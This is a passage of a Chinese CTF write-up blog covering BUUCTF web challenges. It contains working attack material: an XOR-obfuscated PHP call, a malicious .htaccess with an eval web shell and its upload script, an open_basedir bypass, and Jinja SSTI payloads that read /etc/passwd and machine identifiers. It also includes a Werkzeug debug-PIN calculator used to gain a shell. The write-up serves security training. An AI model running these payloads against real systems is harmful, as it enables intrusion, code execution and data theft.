class="symbol">'d7*92</span>', <span class="symbol">'d8*9d</span>', <span class="symbol">'d9*9c</span>', <span class="symbol">'da*9f</span>', <span class="symbol">'db*9e</span>', <span class="symbol">'dc*99</span>', <span class="symbol">'dd*98</span>', <span class="symbol">'de*9b</span>', <span class="symbol">'df*9a</span>', <span class="symbol">'e0*a5</span>', <span class="symbol">'e1*a4</span>', <span class="symbol">'e2*a7</span>', <span class="symbol">'e3*a6</span>', <span class="symbol">'e4*a1</span>', <span class="symbol">'e5*a0</span>', <span class="symbol">'e6*a3</span>', <span class="symbol">'e7*a2</span>', <span class="symbol">'e8*ad</span>', <span class="symbol">'e9*ac</span>', <span class="symbol">'ea*af</span>', <span class="symbol">'eb*ae</span>', <span class="symbol">'ec*a9</span>', <span class="symbol">'ed*a8</span>', <span class="symbol">'ee*ab</span>', <span class="symbol">'ef*aa</span>', <span class="symbol">'f0*b5</span>', <span class="symbol">'f1*b4</span>', <span class="symbol">'f2*b7</span>', <span class="symbol">'f3*b6</span>', <span class="symbol">'f4*b1</span>', <span class="symbol">'f5*b0</span>', <span class="symbol">'f6*b3</span>', <span class="symbol">'f7*b2</span>', <span class="symbol">'f8*bd</span>', <span class="symbol">'f9*bc</span>', <span class="symbol">'fa*bf</span>', <span class="symbol">'fb*be</span>', <span class="symbol">'fc*b9</span>', <span class="symbol">'fd*b8</span>', <span class="symbol">'fe*bb</span>', <span class="symbol">'ff*ba</span>']</span><br><span class="line">[<span class="symbol">'86*d2</span>', <span class="symbol">'87*d3</span>', <span class="symbol">'88*dc</span>', <span class="symbol">'89*dd</span>', <span class="symbol">'8a*de</span>', <span class="symbol">'8b*df</span>', <span class="symbol">'8c*d8</span>', <span class="symbol">'8d*d9</span>', <span class="symbol">'8e*da</span>', <span class="symbol">'8f*db</span>', <span class="symbol">'90*c4</span>', <span class="symbol">'91*c5</span>', <span class="symbol">'92*c6</span>', <span class="symbol">'93*c7</span>', <span class="symbol">'94*c0</span>', <span class="symbol">'95*c1</span>', <span class="symbol">'96*c2</span>', <span class="symbol">'97*c3</span>', <span class="symbol">'98*cc</span>', <span class="symbol">'99*cd</span>', <span class="symbol">'9a*ce</span>', <span class="symbol">'9b*cf</span>', <span class="symbol">'9c*c8</span>', <span class="symbol">'9d*c9</span>', <span class="symbol">'9e*ca</span>', <span class="symbol">'9f*cb</span>', <span class="symbol">'a0*f4</span>', <span class="symbol">'a1*f5</span>', <span class="symbol">'a2*f6</span>', <span class="symbol">'a3*f7</span>', <span class="symbol">'a4*f0</span>', <span class="symbol">'a5*f1</span>', <span class="symbol">'a6*f2</span>', <span class="symbol">'a7*f3</span>', <span class="symbol">'a8*fc</span>', <span class="symbol">'a9*fd</span>', <span class="symbol">'aa*fe</span>', <span class="symbol">'ab*ff</span>', <span class="symbol">'ac*f8</span>', <span class="symbol">'ad*f9</span>', <span class="symbol">'ae*fa</span>', <span class="symbol">'af*fb</span>', <span class="symbol">'b0*e4</span>', <span class="symbol">'b1*e5</span>', <span class="symbol">'b2*e6</span>', <span class="symbol">'b3*e7</span>', <span class="symbol">'b4*e0</span>', <span class="symbol">'b5*e1</span>', <span class="symbol">'b6*e2</span>', <span class="symbol">'b7*e3</span>', <span class="symbol">'b8*ec</span>', <span class="symbol">'b9*ed</span>', <span class="symbol">'ba*ee</span>', <span class="symbol">'bb*ef</span>', <span class="symbol">'bc*e8</span>', <span class="symbol">'bd*e9</span>', <span class="symbol">'be*ea</span>', <span class="symbol">'bf*eb</span>', <span class="symbol">'c0*94</span>', <span class="symbol">'c1*95</span>', <span class="symbol">'c2*96</span>', <span class="symbol">'c3*97</span>', <span class="symbol">'c4*90</span>', <span class="symbol">'c5*91</span>', <span class="symbol">'c6*92</span>', <span class="symbol">'c7*93</span>', <span class="symbol">'c8*9c</span>', <span class="symbol">'c9*9d</span>', <span class="symbol">'ca*9e</span>', <span class="symbol">'cb*9f</span>', <span class="symbol">'cc*98</span>', <span class="symbol">'cd*99</span>', <span class="symbol">'ce*9a</span>', <span class="symbol">'cf*9b</span>', <span class="symbol">'d2*86</span>', <span class="symbol">'d3*87</span>', <span class="symbol">'d8*8c</span>', <span class="symbol">'d9*8d</span>', <span class="symbol">'da*8e</span>', <span class="symbol">'db*8f</span>', <span class="symbol">'dc*88</span>', <span class="symbol">'dd*89</span>', <span class="symbol">'de*8a</span>', <span class="symbol">'df*8b</span>', <span class="symbol">'e0*b4</span>', <span class="symbol">'e1*b5</span>', <span class="symbol">'e2*b6</span>', <span class="symbol">'e3*b7</span>', <span class="symbol">'e4*b0</span>', <span class="symbol">'e5*b1</span>', <span class="symbol">'e6*b2</span>', <span class="symbol">'e7*b3</span>', <span class="symbol">'e8*bc</span>', <span class="symbol">'e9*bd</span>', <span class="symbol">'ea*be</span>', <span class="symbol">'eb*bf</span>', <span class="symbol">'ec*b8</span>', <span class="symbol">'ed*b9</span>', <span class="symbol">'ee*ba</span>', <span class="symbol">'ef*bb</span>', <span class="symbol">'f0*a4</span>', <span class="symbol">'f1*a5</span>', <span class="symbol">'f2*a6</span>', <span class="symbol">'f3*a7</span>', <span class="symbol">'f4*a0</span>', <span class="symbol">'f5*a1</span>', <span class="symbol">'f6*a2</span>', <span class="symbol">'f7*a3</span>', <span class="symbol">'f8*ac</span>', <span class="symbol">'f9*ad</span>', <span class="symbol">'fa*ae</span>', <span class="symbol">'fb*af</span>', <span class="symbol">'fc*a8</span>', <span class="symbol">'fd*a9</span>', <span class="symbol">'fe*aa</span>', <span class="symbol">'ff*ab</span>']</span><br></pre></td></tr></table></figure>

<p>之后就可以开始构造了</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span><span class="number">86</span><span class="meta">%</span><span class="number">86</span><span class="meta">%</span><span class="number">86</span><span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>d<span class="number">9</span><span class="meta">%</span>c<span class="number">1</span><span class="meta">%</span>c<span class="number">3</span><span class="meta">%</span>d<span class="number">2</span>&#125;&#123;<span class="meta">%</span><span class="number">86</span>&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span><span class="number">86</span>=phpi<span class="symbol">nfo</span></span><br></pre></td></tr></table></figure>

<p>成功执行<br><img src="/2020/05/16/BUU-web5/1589591086671.png" alt="1589591086671"></p>
<p>这样便可以调用<code>get_the_flag</code>函数，之后是绕过文件上传，这个为apache服务器，所以可以上传.htaccess文件</p>
<p>因为<code>php = 7.2</code>所以不能用<code>&lt;script&gt;</code>来绕过文件内容（&lt;?）过滤。在上面<code>phpinfo</code>中可以看，这个为apache服务器，所以可以上传.htaccess文件绕过文件名过滤，然后通过编码解码绕过文件内容过滤。</p>
<p>对于<code>exif_imagetype()</code>的绕过方式：</p>
<ul>
<li>使用<code>\x00\x00\x8a\x39\x8a\x39</code>绕过</li>
<li>使用<code>#define width 1337\n#define height 1337</code>绕过</li>
</ul>
<p>关于<code>.htaccess</code>常见绕过利用可以参考：<a href="https://www.wh1teze.top/articles/2020/02/04/[https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93](https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93)" target="_blank" rel="noopener">.htaccess tricks总结</a></p>
<p>所以构造.htaccess</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt   <span class="comment">###将1.test以php的方式解析</span></span><br><span class="line">php_value auto_append_file  <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_48cd8b43081896fbd0931d204f947663/shell.txt"</span></span><br><span class="line"><span class="comment">##在shell.txt加载完毕后，再次包含base64解码后的shell.txt，成功getshell，所以这也就是为什么会出现两次shell.txt内容的原因，第一次是没有经过base64解密的，第二次是经过解密并且转化为php了的。</span></span><br></pre></td></tr></table></figure>

<p>构造木马文件shell.txt:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x8a\x39\x8a\x39</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'s'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用python进行文件上传：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://e093dc1f-cf88-428e-b48c-8a3a58f5a2c3.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .txt</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_48cd8b43081896fbd0931d204f947663/shell.txt"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span>+ base64.b64encode(<span class="string">b"&lt;?php eval($_GET['a']);?&gt;"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.txt'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589596932895.png" alt="1589596932895"></p>
<p>上传成功并执行phpinfo()<br><img src="/2020/05/16/BUU-web5/1589596970844.png" alt="1589596970844"></p>
<p>其中禁用了很多函数，所以不能执行命令<br><img src="/2020/05/16/BUU-web5/1589597199043.png" alt="1589597199043"></p>
<p>同时使用<code>open_basedir</code>进行目录访问限制</p>
<p><strong>open_basedir 绕过</strong></p>
<blockquote>
<p>绕过方法大致如下（php5有其它方法）：</p>
<ul>
<li>首先构造一个相对可以上跳的open_basedir 如<code>mkdir(&#39;mayi&#39;); chdir(&#39;mayi&#39;)</code> 当然我们这里有上跳的路径我们直接 <code>chdir(&quot;img&quot;)</code></li>
<li>然后每次操作<code>chdir(&quot;..&quot;)</code>都会进一次open_basedir的比对由于相对路径的问题，每次open_basedir的补全都会上跳。</li>
<li>比如初试open_basedir为/a/b/c/d：</li>
<li>第一次chdir后变为/a/b/c，第二次chdir后变为/a/b，第三次chdir后变为/a　第四次chdir后变为/</li>
<li>那么这时候再进行ini_set，调整open_basedir为/即可通过php_check_open_basedir_ex的校验，成功覆盖，导致我们可以bypass open_basedir。</li>
</ul>
</blockquote>
<p>先构造</p>
<blockquote>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'xxx'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">var_dump</span>(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>
</blockquote>
<p>得到flag文件名，在读取<br><img src="/2020/05/16/BUU-web5/1589597718976.png" alt="1589597718976"></p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="built_in">chdir</span>(<span class="string">'xxx'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));var_dump(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589597781687.png" alt="1589597781687"></p>
<p>参考文章：<a href="https://www.wh1teze.top/articles/2020/02/04/1580806413437.html" target="_blank" rel="noopener">https://www.wh1teze.top/articles/2020/02/04/1580806413437.html</a><br>本来想使用上一个题的方法绕过disable_function，但是使用蚁剑连接后权限不够，所以放弃了</p>
<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>打开靶机是一个base64加密解密网站<br>在解密的地方随便输入一段发现报错并泄露了一部分源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">'text'</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">"text"</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">"结果 ： &#123;0&#125;"</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">"no no no !!"</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame        </span><br><span class="line">res =  render_template_string(tmp)</span><br><span class="line"></span><br><span class="line"><span class="comment">##获取我们传的text参数，进行解密，如果可以过waf则执行代码</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589600193445.png" alt="1589600193445"></p>
<p>之后将8加密后进行解密返回nonono!!，再尝试将加密在解密返回<br><img src="/2020/05/16/BUU-web5/1589600318291.png" alt="1589600318291"></p>
<p>说明存在模板注入<br>读取源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'app.py'</span>,<span class="string">'r'</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>发现waf过滤了flag，os等关键字<br><img src="/2020/05/16/BUU-web5/1589612427990.png" alt="1589612427990"></p>
<p><img src="/2020/05/16/BUU-web5/1589612627542.png" alt="1589612627542"></p>
<p>之后利用字符串拼接找目录</p>
<p>发现了this_is_the_flag.txt</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">75</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'__builtins__'</span>][<span class="symbol">'__imp'+'ort__'</span>]('o'+'s').listdir('/')&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589612776280.png" alt="1589612776280"></p>
<p><strong>读取使用切片省去了拼接flag的步骤</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123;c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589612930582.png" alt="1589612930582"></p>
<p><strong>还有一种便是读取pin码</strong></p>
<p><strong>计算pin码的方法</strong></p>
<p>只要拿到<code>pin码</code>就相当于拿到了shell，想要拿到<code>PIN码</code>必须知道：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usrname: 就是启动这个 Flask的用户</span><br><span class="line">modname： 一般为flask.app</span><br><span class="line"><span class="function"><span class="title">getattr</span><span class="params">(app, “__name__”, app.__class__.__name__)</span></span>：python该值一般为Flask 值一般不变</span><br><span class="line"><span class="function"><span class="title">getattr</span><span class="params">(mod, <span class="string">'file'</span>, None)</span></span>：为flask目录下的一个app.py的绝对路径</span><br><span class="line">uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</span><br><span class="line"><span class="function"><span class="title">get_machine_id</span><span class="params">()</span></span> ：/etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值</span><br><span class="line">假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值 假如是Docker机 那么为 /proc/self/cgroup docker行</span><br></pre></td></tr></table></figure>

<p><strong>服务器运行flask所登录的用户名</strong></p>
<p> 我们可以查看/etc/passwd文件。使用如下命令</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">-1</span>].<span class="strong">__subclasses__</span>()[<span class="string">102</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/etc/passwd'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以知道是<code>flaskweb</code>用户。</p>
<p><strong>getattr(mod, ‘file’, None)flask目录下的app.py的绝对路径</strong></p>
<p> 根据报错信息我们可以知道:</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">python3</span>.7/<span class="title">site</span>-<span class="title">packages</span>/<span class="title">flask</span>/<span class="title">app</span>.<span class="title">py</span></span></span><br></pre></td></tr></table></figure>

<p><strong>当前电脑的MAC地址</strong></p>
<p> 我们可以读取<code>/sys/class/net/eth0/address</code>来获得mac的16进制：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">102</span>].__init__.__globals__[<span class="string">'open'</span>](<span class="string">'/sys/class/net/eth0/address'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到<code>02:42:ae:01:56:23</code>将其转10进制<code>2485410420259</code>许多工具都不准确，值得注意。</p>
<p><strong>机器的id</strong></p>
<p> linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。<br> 对于docker机则读取读取/proc/self/cgroup获取get_machine_id()(docker后面那段字符串)<br>使用如下:</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">-1</span>].<span class="strong">__subclasses__</span>()[<span class="string">102</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/proc/self/cgroup'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得知:</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">695775</span>f<span class="number">45371</span>f<span class="number">74</span>ba<span class="number">02406e7</span>df<span class="number">3</span>fa<span class="number">817</span>d<span class="number">00641</span>a<span class="number">41</span>db<span class="number">503</span>f<span class="number">9e7</span><span class="keyword">c</span><span class="number">79</span>ab<span class="number">04</span>d<span class="number">986</span><span class="keyword">c</span><span class="number">8</span><span class="keyword">c</span></span><br></pre></td></tr></table></figure>

<p><strong>使用脚本</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>, <span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485410420259'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'695775f45371f74ba02406e7df3fa817d00641a41db503f9e7c79ab04d986c8c'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>得到pin码为<code>155-092-742</code><br><img src="/2020/05/16/BUU-web5/1589613745642.png" alt="1589613745642"></p>
<p>进入报错页面，点击终端按钮，然后输入 pin码<code>155-092-742</code>然后就可以执行python shell了<br>我们使用如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">'cat /this_is_the_flag.txt'</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589613814849.png" alt="1589613814849"></p>
<p>参考文章：<br><a href="https://www.twblogs.net/a/5eac12af6052e15026732da5" target="_blank" rel="noopener">https://www.twblogs.net/a/5eac12af6052e15026732da5</a><br><a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/" target="_blank" rel="noopener">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p>
<h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">        $http_x_headers = explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $http_x_headers[<span class="number">0</span>];</span><br><span class="line">    &#125;	<span class="comment">#如果存在x-Forwarded-For头，将其打散成数组，将第一个值给$_SERVER['REMOTE_ADDR']</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"></span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);	<span class="comment">#改变目录</span></span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line"><span class="comment">#escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的</span></span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);	<span class="comment">#返回路径信息</span></span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    highlight_file(<span 